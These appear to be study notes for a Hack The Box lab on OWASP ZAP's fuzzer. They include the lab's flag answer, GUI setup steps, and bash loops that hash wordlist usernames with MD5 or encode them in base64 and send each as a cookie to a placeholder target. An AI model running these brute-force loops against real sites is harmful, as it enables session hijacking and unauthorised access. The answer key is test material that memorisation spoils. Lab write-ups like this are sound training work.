# Section 11 — ZAP Fuzzer

> ZAP's built-in fuzzer — no rate limit (unlike Burp Community). Use for directory fuzzing, cookie fuzzing, brute-force.

---

## Lab Answer

| Question | Answer |
|----------|--------|
| Fuzz MD5-hashed usernames as cookie value | `HTB{fuzz1n6_my_f1r57_c00k13}` |

**The winning username:** `user` → MD5: `ee11cbb19052e40b07aac0ca060c23ee`

**Script approach (fastest — no GUI needed):**
```bash
while read user; do
    hash=$(echo -n "$user" | md5sum | cut -d' ' -f1)
    resp=$(curl -s -b "cookie=$hash" http://TARGET/skills/)
    if echo "$resp" | grep -q "HTB{"; then
        echo "HIT: $user ($hash)"
        echo "$resp" | grep -o "HTB{[^}]*}"
    fi
done < ~/SecLists/Usernames/top-usernames-shortlist.txt
```

**What this does:**
1. Reads each username from the wordlist
2. MD5-hashes it (`echo -n "user" | md5sum`)
3. Sends it as the cookie value
4. Checks the response for the flag

---

## ZAP Fuzzer Setup (GUI Method)

The ZAP equivalent of Burp Intruder — no rate limiting in the free version.

### Step 1 — Open the Fuzzer

```
1. Proxy History → find the request you want to fuzz
2. Right-click → Attack → Fuzz
```

### Step 2 — Set Fuzz Location

```
1. In the Fuzzer window, select the text you want to replace (e.g., "test" in the URL, or a cookie value)
2. Click Add on the right pane
3. The selected text gets highlighted in green = the fuzz position
```

### Step 3 — Configure Payloads

Click Add in the Payloads window → choose type:

| Payload Type | Use Case |
|-------------|----------|
| **File** | Load a wordlist from a local file |
| **File Fuzzers** | Built-in ZAP wordlists (dirbuster, etc.) |
| **Numberzz** | Sequence of numbers with custom step |
| **String** | Fixed string |
| **Regex** | Generate strings matching a regex pattern |

**For cookie MD5 fuzzing:** Use "File" → load `top-usernames-shortlist.txt`

### Step 4 — Add Processors

Processors transform each payload before sending. Click Add:

| Processor | When to Use |
|-----------|-------------|
| **MD5 Hash** | Hash each username before using as cookie value |
| **Base64 Encode** | Encode payloads to base64 |
| **URL Encode** | Encode special characters |
| **Prefix String** | Prepend text to every payload |
| **Postfix String** | Append text (e.g., add `.html` extension) |
| **Script** | Custom processing via ZAP script |

**For the cookie lab:** Add a **MD5 Hash** processor so ZAP automatically hashes each username before setting the cookie.

Click "Generate Preview" to verify the payload looks correct before running.

### Step 5 — Options

```
Concurrent threads: 20   (faster = more threads, but don't overwhelm small servers)
Retries on IO error: 3
Strategy: Depth First (tries all payloads on one position before moving)
         or Breadth First (good for multi-position attacks)
```

### Step 6 — Start and Analyze

```
Click "Start Fuzzer"
Sort results by: Response Code (look for 200) or Size (different size = different response)
Click any result to see the full request/response
```

---

## ZAP Fuzzer vs Burp Intruder

| Feature | ZAP Fuzzer | Burp Intruder Community | Burp Intruder Pro |
|---------|-----------|------------------------|------------------|
| Speed | Unlimited | 1 req/sec (throttled) | Unlimited |
| Cost | Free | Free | Paid |
| Built-in wordlists | ✅ (dirbuster, etc.) | ❌ | ❌ |
| Payload processors | ✅ (MD5, Base64, URL) | ✅ (more options) | ✅ |
| Attack types | Basic | Sniper/Cluster Bomb/Pitchfork | Same |
| Best for | Free fast fuzzing | Learning, small tests | Advanced fuzzing |

**Recommendation:** ZAP Fuzzer for free-tier speed + built-in wordlists. Burp Pro Intruder for advanced attack types.

---

## Common Cookie/Token Fuzzing Patterns

```bash
# MD5 hash a username:
echo -n "admin" | md5sum | cut -d' ' -f1

# Try all usernames from a list as MD5-hashed cookies:
while read user; do
    hash=$(echo -n "$user" | md5sum | cut -d' ' -f1)
    curl -s -b "cookie=$hash" http://TARGET/path/
done < wordlist.txt

# Base64 encode a value:
echo -n '{"user":"admin"}' | base64

# Try base64 cookies:
while read user; do
    token=$(echo -n "{\"user\":\"$user\"}" | base64)
    curl -s -b "session=$token" http://TARGET/
done < wordlist.txt
```

---

## Exam Notes

- ZAP Fuzzer has **no rate limit** — prefer it over Burp Community Intruder for speed
- ZAP has built-in File Fuzzers (dirbuster wordlists) — no need to specify a file path
- The **MD5 Hash processor** is the key feature for cookie fuzzing challenges
- Sort results by **Response Code** first, then by **Size Resp. Body** — different sizes reveal different responses
- The script approach with curl + md5sum is faster for simple challenges than using a GUI
- Cookie value `084e0343a0486ff05530df6c705c8bb4` = MD5("guest") — always verify with `echo -n "guest" | md5sum`
